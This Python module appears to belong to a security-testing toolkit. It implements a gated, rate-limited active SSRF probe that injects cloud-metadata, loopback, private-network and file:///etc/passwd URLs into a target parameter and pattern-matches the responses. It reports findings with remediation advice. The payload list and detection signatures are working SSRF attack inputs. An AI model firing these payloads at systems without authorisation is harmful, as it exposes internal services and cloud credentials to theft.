"""F114.B — Active SSRF Probe (semi-blind).

Active SSRF probing without an out-of-band callback server is
inherently limited. This probe focuses on signal sources that
DON'T require OOB:

  (1) Cloud metadata: AWS / GCP / Azure / Alibaba publish well-known
      HTTP endpoints. If the target's server-side fetcher hits one
      of these AND returns the body, we can pattern-match the
      response.
  (2) Loopback + RFC1918: hitting `127.0.0.1:80` vs `127.0.0.1:99`
      gives different timing + status. Useful when the target leaks
      response bodies.
  (3) Error-message signals: many naive SSRF handlers leak server
      stack traces (`getaddrinfo failed`, `Connection refused`,
      `dial tcp 169.254.169.254`).
  (4) Optional operator-supplied canary URL: if the operator runs
      a self-hosted interactsh-like callback server, they can pass
      a canary URL and check their own logs.

Double-gate banca-safety:
  * `fire=True` config arg
  * `KRYON_SSRF_FIRE=true` env var
Both required."""

from __future__ import annotations

import os
import re
import time
from dataclasses import dataclass, field
from urllib.parse import urlencode, urlparse

import requests
from requests.adapters import HTTPAdapter

from kryon.tools.api.ssrf_patterns import (
    SsrfFinding,
)

__all__ = [
    "SsrfActiveConfig",
    "SsrfActiveResult",
    "SsrfProbeAttempt",
    "probe_ssrf_active",
    "default_ssrf_payloads",
]


_FIRE_ENV = "KRYON_SSRF_FIRE"


def default_ssrf_payloads() -> tuple[str, ...]:
    """The banca-safe fixed default payload set."""
    return (
        # AWS EC2 instance metadata
        "http://169.254.169.254/latest/meta-data/",
        # AWS metadata IMDSv2 try (requires PUT for token, but GET on
        # endpoint still responds with 401 if reachable, which is
        # signal enough)
        "http://169.254.169.254/",
        # GCP metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        # Azure IMDS
        "http://169.254.169.254/metadata/instance",
        # Alibaba Cloud
        "http://100.100.100.200/",
        # Loopback
        "http://127.0.0.1/",
        "http://127.0.0.1:80/",
        "http://localhost/",
        # IPv6 loopback
        "http://[::1]/",
        # RFC 1918 — random plausible internal range
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://192.168.1.1/",
        # File scheme — some libs honor file:// (gophers, curl,
        # libcurl-based fetchers); banca: this WILL not exfil real
        # files, just probes whether file:// is allowed at all
        "file:///etc/passwd",
    )


# Response signatures that indicate a successful SSRF (response body
# echoes the upstream content). NOT exhaustive but covers the main
# cloud-metadata cases.
_SUCCESS_SIGS: tuple[tuple[re.Pattern, str], ...] = (
    (re.compile(rb"ami-id|instance-id|hostname|public-keys|iam/security-credentials", re.IGNORECASE), "aws-metadata"),
    (re.compile(rb"computeMetadata/v\d|projects/-?\d+|instance/service-accounts", re.IGNORECASE), "gcp-metadata"),
    (re.compile(rb'"compute"|"network"|"vmId"', re.IGNORECASE), "azure-imds"),
    (re.compile(rb"root:x:0:0:|/bin/(?:bash|sh)", re.IGNORECASE), "file-etc-passwd"),
    # Internal services that often respond with banners
    (re.compile(rb"<title>Apache.*?</title>|nginx/\d+", re.IGNORECASE), "internal-http-banner"),
)


# Error-message signatures: if a target HANDLED our payload but
# leaked a back-end error string, that's strong signal SSRF is real
# (it tried + failed, instead of validating client-side).
_ERROR_LEAK_SIGS: tuple[re.Pattern, ...] = (
    re.compile(rb"dial tcp\s+\d+\.\d+\.\d+\.\d+", re.IGNORECASE),
    re.compile(rb"connection refused.*?\d+\.\d+\.\d+\.\d+", re.IGNORECASE),
    re.compile(rb"getaddrinfo.*?failed", re.IGNORECASE),
    re.compile(rb"no route to host", re.IGNORECASE),
    re.compile(rb"java\.net\.[A-Za-z]*Exception", re.IGNORECASE),
    re.compile(rb"urllib\.error\.URLError", re.IGNORECASE),
    re.compile(rb"requests\.exceptions\.Connection", re.IGNORECASE),
)


@dataclass(frozen=True)
class SsrfActiveConfig:
    endpoint_url: str
    parameter_name: str
    canary_url: str = ""  # operator-supplied OOB callback URL (optional)
    payloads: tuple[str, ...] = ()  # override; empty = default_ssrf_payloads()
    fire: bool = False
    timeout_seconds: float = 5.0
    rate_limit_per_second: float = 3.0
    follow_redirects: bool = False
    user_agent: str = "Kryon-SSRF/1.0 (banca-safe; +read-only)"
    extra_headers: tuple[tuple[str, str], ...] = ()
    extra_cookies: tuple[tuple[str, str], ...] = ()
    max_body_bytes: int = 8_000


@dataclass(frozen=True)
class SsrfProbeAttempt:
    payload: str
    request_url: str
    http_status: int
    response_body_snippet: str = ""
    elapsed_seconds: float = 0.0
    detected_signature: str = ""  # "aws-metadata" / "file-etc-passwd" / "error-leak" / ""
    error: str = ""


@dataclass(frozen=True)
class SsrfActiveResult:
    findings: tuple[SsrfFinding, ...] = field(default_factory=tuple)
    attempts: tuple[SsrfProbeAttempt, ...] = field(default_factory=tuple)
    payloads_built: tuple[str, ...] = field(default_factory=tuple)
    fired: bool = False
    fire_gate_state: str = ""
    canary_url_supplied: bool = False
    elapsed_seconds: float = 0.0


def _env_fire_gate() -> bool:
    return os.environ.get(_FIRE_ENV, "").strip().lower() in ("true", "1", "yes")


def _classify_body(body: bytes) -> str:
    """Return the signature name if body matches a known SSRF
    success pattern."""
    if not body:
        return ""
    for pattern, label in _SUCCESS_SIGS:
        if pattern.search(body):
            return label
    for pattern in _ERROR_LEAK_SIGS:
        if pattern.search(body):
            return "error-leak"
    return ""


def _build_probe_url(base: str, parameter_name: str, value: str) -> str:
    parsed = urlparse(base)
    pairs: list[tuple[str, str]] = []
    if parsed.query:
        for entry in parsed.query.split("&"):
            if "=" in entry:
                k, v = entry.split("=", 1)
                pairs.append((k, v))
            elif entry:
                pairs.append((entry, ""))
    replaced = False
    out_pairs: list[tuple[str, str]] = []
    for k, v in pairs:
        if k == parameter_name and not replaced:
            out_pairs.append((k, value))
            replaced = True
        else:
            out_pairs.append((k, v))
    if not replaced:
        out_pairs.append((parameter_name, value))
    new_query = urlencode(out_pairs, safe=":/?#[]@!$&'()*+,;=")
    return parsed._replace(query=new_query).geturl()


def probe_ssrf_active(config: SsrfActiveConfig) -> SsrfActiveResult:
    t0 = time.monotonic()
    payloads = list(config.payloads or default_ssrf_payloads())
    if config.canary_url:
        payloads.append(config.canary_url)
    payloads_tuple = tuple(payloads)

    if not config.fire:
        return SsrfActiveResult(
            payloads_built=payloads_tuple,
            fired=False,
            fire_gate_state="config.fire=False",
            canary_url_supplied=bool(config.canary_url),
            elapsed_seconds=time.monotonic() - t0,
        )
    if not _env_fire_gate():
        return SsrfActiveResult(
            payloads_built=payloads_tuple,
            fired=False,
            fire_gate_state=f"env {_FIRE_ENV}!=true",
            canary_url_supplied=bool(config.canary_url),
            elapsed_seconds=time.monotonic() - t0,
        )

    parsed_ep = urlparse(config.endpoint_url)
    if parsed_ep.scheme not in ("http", "https") or not parsed_ep.hostname:
        return SsrfActiveResult(
            payloads_built=payloads_tuple,
            fired=False,
            fire_gate_state=f"invalid endpoint_url scheme {parsed_ep.scheme!r}",
            elapsed_seconds=time.monotonic() - t0,
        )

    sess = requests.Session()
    sess.headers["User-Agent"] = config.user_agent
    for n, v in config.extra_headers:
        sess.headers[n] = v
    for n, v in config.extra_cookies:
        sess.cookies.set(n, v)
    adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1, max_retries=0)
    sess.mount("http://", adapter)
    sess.mount("https://", adapter)

    min_interval = (
        1.0 / config.rate_limit_per_second
        if config.rate_limit_per_second > 0
        else 0.0
    )
    last = 0.0
    attempts: list[SsrfProbeAttempt] = []
    findings: list[SsrfFinding] = []

    for payload in payloads_tuple:
        if min_interval > 0:
            wait = min_interval - (time.monotonic() - last)
            if wait > 0:
                time.sleep(wait)
        last = time.monotonic()

        probe_url = _build_probe_url(
            config.endpoint_url, config.parameter_name, payload
        )
        a_start = time.monotonic()
        try:
            resp = sess.get(
                probe_url,
                timeout=config.timeout_seconds,
                allow_redirects=config.follow_redirects,
                stream=True,
            )
            deadline = time.monotonic() + config.timeout_seconds
            buf = bytearray()
            try:
                for chunk in resp.iter_content(chunk_size=4096, decode_unicode=False):
                    if time.monotonic() > deadline:
                        break
                    if chunk:
                        buf.extend(chunk)
                    if len(buf) >= config.max_body_bytes:
                        break
            finally:
                resp.close()
            body_bytes = bytes(buf[: config.max_body_bytes])
            signature = _classify_body(body_bytes)
            elapsed = time.monotonic() - a_start
            attempts.append(
                SsrfProbeAttempt(
                    payload=payload,
                    request_url=probe_url,
                    http_status=resp.status_code,
                    response_body_snippet=body_bytes[:800].decode("utf-8", errors="replace"),
                    elapsed_seconds=elapsed,
                    detected_signature=signature,
                )
            )
            if signature:
                findings.append(
                    SsrfFinding(
                        rule_id="SSRF-100",
                        severity="CRITICAL" if signature in {"aws-metadata", "gcp-metadata", "azure-imds", "file-etc-passwd"} else "HIGH",
                        title=f"Confirmed SSRF (signature: {signature})",
                        detail=(
                            f"Probe with payload {payload!r} against "
                            f"parameter {config.parameter_name!r} produced a "
                            f"response containing {signature!r} content — "
                            "server-side fetch reached an internal / metadata "
                            "endpoint and echoed the response back."
                        ),
                        remediation=(
                            "Strict URL allow-list on outbound fetches. Resolve "
                            "DNS once + verify the IP is PUBLIC before dialing. "
                            "Block RFC 1918 + 169.254.0.0/16 + loopback + IPv6 ULA."
                        ),
                        location=config.parameter_name,
                    )
                )
        except (requests.exceptions.RequestException, OSError) as e:
            elapsed = time.monotonic() - a_start
            attempts.append(
                SsrfProbeAttempt(
                    payload=payload,
                    request_url=probe_url,
                    http_status=0,
                    elapsed_seconds=elapsed,
                    error=f"{type(e).__name__}: {e}",
                )
            )

    return SsrfActiveResult(
        findings=tuple(findings),
        attempts=tuple(attempts),
        payloads_built=payloads_tuple,
        fired=True,
        fire_gate_state="both-gates-open",
        canary_url_supplied=bool(config.canary_url),
        elapsed_seconds=time.monotonic() - t0,
    )
